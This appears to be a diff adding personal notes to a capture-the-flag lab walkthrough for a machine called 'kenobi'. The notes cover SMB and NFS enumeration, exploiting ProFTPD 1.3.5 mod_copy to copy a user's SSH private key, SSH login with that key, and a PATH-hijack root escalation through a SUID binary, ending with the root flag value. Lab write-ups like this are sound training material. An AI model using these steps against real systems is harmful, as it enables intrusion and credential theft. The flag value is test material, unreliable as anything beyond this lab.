@@ -2,3 +2,143 @@ Started 6/12/2024
 Samba is referred to as a network file system.
 Based on SMB
 enum shares: nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.188.230
+Host script results:
+| smb-enum-shares: 
+|   account_used: guest
+|   \\10.10.109.138\IPC$: 
+|     Type: STYPE_IPC_HIDDEN
+|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
+|     Users: 1
+|     Max Users: <unlimited>
+|     Path: C:\tmp
+|     Anonymous access: READ/WRITE
+|     Current user access: READ/WRITE
+|   \\10.10.109.138\anonymous: 
+|     Type: STYPE_DISKTREE
+|     Comment: 
+|     Users: 0
+|     Max Users: <unlimited>
+|     Path: C:\home\kenobi\share
+|     Anonymous access: READ/WRITE
+|     Current user access: READ/WRITE
+|   \\10.10.109.138\print$: 
+|     Type: STYPE_DISKTREE
+|     Comment: Printer Drivers
+|     Users: 0
+|     Max Users: <unlimited>
+|     Path: C:\var\lib\samba\printers
+|     Anonymous access: <none>
+|_    Current user access: <none>
+
+3 shares found.
+
+we can then connect using smbclient:
+smbclient //10.10.109.138/anonymous
+
+This shows us the RPC program
+nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.109.138
+PORT    STATE SERVICE
+111/tcp open  rpcbind
+| nfs-showmount: 
+|_  /var *
+
+This shows that the mount is on var
+
+This computer is running ftpd, we can check what version it is:
+└─$ nmap -sV -p 21 10.10.109.138                                      
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-13 21:45 EDT
+Nmap scan report for 10.10.109.138
+Host is up (0.10s latency).
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     ProFTPD 1.3.5
+Service Info: OS: Unix
+
+we can use this to find vulns
+searchsploit ProFtpd 1.3.5
+
+This shows 4 vulns:
+-------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                |  Path
+-------------------------------------------------------------- ---------------------------------
+ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)     | linux/remote/37262.rb
+ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution           | linux/remote/36803.py
+ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)       | linux/remote/49908.py
+ProFTPd 1.3.5 - File Copy                                     | linux/remote/36742.txt
+-------------------------------------------------------------- ---------------------------------
+
+The mod_copy module implements SITE CPFR and SITE CPTO commands
+
+we can use this to see those:
+nc 10.10.109.138 21
+└─$ nc 10.10.109.138 21         
+220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.109.138]
+SITE CPFR /home/kenobi/.ssh/id_rsa
+350 File or directory exists, ready for destination name
+SITE CPTO /var/tmp/id_rsa
+250 Copy successful
+
+(ip address of target machine changed)
+We know the mount is in /var on the machine because of what we did previously
+we can now mount to that machine...
+udo mkdir /mnt/kenobiNFS
+[sudo] password for kali: 
+                                                                                                
+┌──(kali㉿kali)-[~]
+└─$ sudo mount 10.10.206.58:/var /mnt/kenobiNFS 
+                                                                                                
+┌──(kali㉿kali)-[~]
+└─$ ls -la /mnt/kenobiNFS 
+total 56
+drwxr-xr-x 14 root root  4096 Sep  4  2019 .
+drwxr-xr-x  3 root root  4096 Jun 13 22:21 ..
+drwxr-xr-x  2 root root  4096 Sep  4  2019 backups
+drwxr-xr-x  9 root root  4096 Sep  4  2019 cache
+drwxrwxrwt  2 root root  4096 Sep  4  2019 crash
+drwxr-xr-x 40 root root  4096 Sep  4  2019 lib
+drwxrwsr-x  2 root staff 4096 Apr 12  2016 local
+lrwxrwxrwx  1 root root     9 Sep  4  2019 lock -> /run/lock
+drwxrwxr-x 10 root _ssh  4096 Sep  4  2019 log
+drwxrwsr-x  2 root mail  4096 Feb 26  2019 mail
+drwxr-xr-x  2 root root  4096 Feb 26  2019 opt
+lrwxrwxrwx  1 root root     4 Sep  4  2019 run -> /run
+drwxr-xr-x  2 root root  4096 Jan 29  2019 snap
+drwxr-xr-x  5 root root  4096 Sep  4  2019 spool
+drwxrwxrwt  6 root root  4096 Jun 13 22:22 tmp
+drwxr-xr-x  3 root root  4096 Sep  4  2019 www
+
+sudo mkdir /mnt/kenobiNFS
+sudo mount 10.10.206.58:/var /mnt/kenobiNFS
+ls -la /mnt/kenobiNFS
+
+Now that we've made a directory mount, we can copy the key to our machine and ssh
+cp /mnt/kenobiNFS/tmp/id_rsa .
+sudo chmod 600 id_rsa
+ssh -i id_rsa kenobi@10.10.239.150
+
+SUID Bit	User executes the file with permissions of the file owner	-
+SGID Bit	User executes the file with the permission of the group owner. File created in directory gets the same group owner.
+Sticky Bit	No meaning	Users are prevented from deleting files from other users.
+
+find / -perm -u=s -type f 2>/dev/null
+this is to find SUID files ^
+
+this file looks out of the ordinary: /usr/bin/menu
+let's run strings on it: curl -I localhost
+uname -r
+ifconfig
+
+This shows us that it's running commands without a path which we can exploit...
+kenobi@kenobi:/tmp$ echo /bin/sh > curl
+kenobi@kenobi:/tmp$ chmod 777 curl
+kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
+kenobi@kenobi:/tmp$ /usr/bin/menu
+
+***************************************
+1. status check
+2. kernel version
+3. ifconfig
+** Enter your choice :1
+# cat /root/root.txt
+177b3cd8562289f37382721c28381f02
+
